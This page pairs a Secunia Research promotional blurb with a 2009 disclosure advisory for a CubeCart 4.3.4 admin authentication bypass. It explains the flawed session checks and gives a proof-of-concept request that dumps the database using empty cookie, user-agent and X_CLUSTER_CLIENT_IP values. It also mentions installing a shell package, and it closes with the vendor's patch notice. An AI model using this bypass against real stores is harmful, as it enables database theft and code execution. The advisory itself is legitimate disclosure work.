How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

## Release Date

: 2009/10/29

## Author

: Bogdan Calin (bogdan [at] acunetix [dot] com)

## Severity

: Critical

## Vendor Status

: Vendor has released an updated version

## I. Background

*From Wikipedia*: CubeCart is a free-to-use eCommerce software solution, designed to allow individuals and businesses sell tangible and digital goods on line. CubeCart is not Open Source software, although full source code is available at no cost, and the custom licensing model allows for customisation of the code.

…

CubeCart has developed a large fanbase, due in part, to the relative ease of creating modifications and enhancements. In the September/October 2007 issue of Practical eCommerce magazine, CubeCart was placed at #1 in their list of ‘100 Most Notable Shopping Carts’.

## II. Description

While auditing the source code of CubeCart version v4.3.4, I’ve found a critical vulnerability in this application. Session managament for administrative users is flawed. It is easy to bypass it without providing any credentials. An attacker can later perform any actions the administrator can, such as dumping the database, install modules (PHP code execution) and so on.

CubeCart is using a MySQL table named CubeCart\_admin\_users for storing information about administrative users.

When an administrator logs in, the applications stores his session ID, browser (user agent) and IP address in the sessId, browser and sessIP fields.

![cubecart_select_admin_loggedin](https://cdn.acunetix.com/wp_content/uploads/2009/10/cubecart_select_admin_loggedin.png "cubecart_select_admin_loggedin")

When the adminstrator logs out, these values are cleared. So sessId and the others fields become empty (as in an empty string).

![cubecart_select_admin_loggedout](https://cdn.acunetix.com/wp_content/uploads/2009/10/cubecart_select_admin_loggedout.png "cubecart_select_admin_loggedout")

Let’s analyze the code:

In *classessessioncc\_admin\_session.php*, on line 56 there is:

*$query = sprintf(“SELECT \* FROM “.$this->glob[‘dbprefix’].”CubeCart\_admin\_users WHERE sessId = %s”, $this->db->mySQLSafe($GLOBALS[CC\_ADMIN\_SESSION\_NAME]));*

This will select the fields for the administrative user corresponding to the session identified by sessID.

But when the administrative user is logged out, sessID is empty. So, we can bypass this check by using an empty sessID.

There are 2 more checks that need to be bypassed:

There is this piece of code:

*if (strpos($\_SERVER[‘HTTP\_USER\_AGENT’],’AOL’) == false && $ccAdminData[0][‘sessIp’] !== $client\_ip || $ccAdminData[0][‘browser’] !== $\_SERVER[‘HTTP\_USER\_AGENT’]) {*

*$this->logout();*

*}*

The HTTP\_USER\_AGENT check can be easily bypassed using an empty user agent.  How about the $client\_ip check?  At first I was thinking that it’s not possible to bypass that.  Let’s look at the code:

Filename *includesfunctions.inc.php*, line 36

![](https://cdn.acunetix.com/wp_content/uploads/2009/10/cubecart_get_ip_address_source_code.png)

There are all these complex checks for validating $\_SERVER[‘REMOTE\_ADDR’]. However, $\_SERVER[‘REMOTE\_ADDR’], which cannot be faked.  And then, on the second line there is:

*if(isset($\_SERVER[‘HTTP\_X\_CLUSTER\_CLIENT\_IP’])

&& !detectSSL()) return $\_SERVER[‘HTTP\_X\_CLUSTER\_CLIENT\_IP’];*

This line will bypass all those complex checks. So, you just need to send an X\_CLUSTER\_CLIENT\_IP header with an empty value.  This line of code (the one with X\_CLUSTER\_CLIENT\_IP) looks like a hack to me.It was probably added later to fix some bug or add a new feature.

## III. Proof of concept

The conclusion is that by entering empty sessId (ccAdmin cookie), user-agent and X\_CLUSTER\_CLIENT\_IP header you can bypass the authentication and perform any actions an adminstrator can perform.

Here is a sample HTTP request that will dump the whole database in one request:

```
---------------------------------------------------------------------------------
POST /CubeCart-latest/admin.php?_g=maintenance/backup HTTP/1.1
Host: bld02
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryCpv+NVAHAgHHdvdI

-- PHP Version: 5.2.6-2ubuntu4.3
--
-- Database: `cubecartlatest`
-- --------------------------------------------------------

-- Table structure for table `CubeCart_Coupons`
--

...

CREATE TABLE `CubeCart_transactions` (
   `id` int(11) NOT NULL auto_increment,
   `gateway` varchar(255),
   `extra` varchar(255),
   `status` varchar(50),
   `customer_id` int(11),
   `order_id` varchar(255),
   `trans_id` varchar(50),
   `time` int(10),
   `amount` decimal(30,2),
   `remainder` decimal(30,2) DEFAULT '0.00' NOT NULL,
   `notes` text,
 PRIMARY KEY (`id`),
 KEY `customer_id` (`customer_id`)
) ENGINE MyISAM DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 COLLATE=utf8_unicode_ci ;

--
-- Dumping data for table `CubeCart_transactions`
--
```

An administrator can install CubeCart packages, and it’s trivial to create a dummy package with a shell inside and install it.  Therefore, PHP code execution is possible and quite trivial.

## IV. Workaround

The vendor was notified about this vulnerability on 20 October 2009 and they’ve released a fix on 26 October 2009

The problem was fixed in CubeCart version 4.3.5, which is available here: <http://forums.cubecart.com/index.php?showtopic=39691>.

However, the post “CubeCart 4.3.5 Released, Maintenance Release”, doesn’t include any information about this critical vulnerability.

> Whats new?

> – URL’s Changed in WorldPay module to match “RBS Worldpay” branding
>
> – PayPal 3D Secure Fix & Enhancements \*
>
> – Moneybookers Payment Notification Fix
>
> – Database Class Optimization
>
> – Misc bugs…

I find this behaviour completely unprofessional: a vendor should inform his customers when a serious vulnerability is fixed in their product, especially when the product is processing credit card data, like CubeCart does.

## Update:

CubeCart [responded and informed their customers about this vulnerability](http://forums.cubecart.com/index.php?showtopic=39748). That’s great 🙂

Posted November 2, 2009

A CubeCart [admin session vulnerability](https://www.acunetix.com/blog/websecuritynews/cubecart-4-session-management-bypass-leads-to-administrator-access/) was reported to us last week and was quickly patched in CubeCart 4.3.5. In true error we failed to mention this in the release notes. This exploit is not that easy to replicate so only an experienced hacker would be able to cause harm.

We wish to make a formal apology about this as we had absolutely no intention to mask this from our customers. We pride ourselves on honest and responsible and we are sincerely very sorry.

To patch your store please upgrade to CubeCart 4.3.5 or simply upload the attached files over your existing one.

/classes/session/cc\_admin\_session.php

[cc\_admin\_session.php](https://forums.cubecart.com/applications/core/interface/file/attachment.php?id=1568)

Please note that this does not affect CubeCart version 3.
